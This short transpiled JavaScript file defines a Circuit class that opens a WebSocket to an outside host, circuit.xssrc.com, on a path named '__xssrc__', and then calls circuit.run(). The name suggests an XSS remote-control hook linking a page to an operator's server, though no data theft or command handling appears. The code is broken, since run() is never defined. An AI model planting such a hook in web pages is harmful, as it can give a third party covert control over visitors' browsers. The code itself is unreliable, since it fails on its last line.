"use strict";

var _classCallCheck = function (instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } };

var Circuit = function Circuit() {
  _classCallCheck(this, Circuit);

  this.ws_ = new WebSocket("ws://circuit.xssrc.com:8080/__xssrc__/circuit/connection");
};

var circuit = new Circuit();
circuit.run();
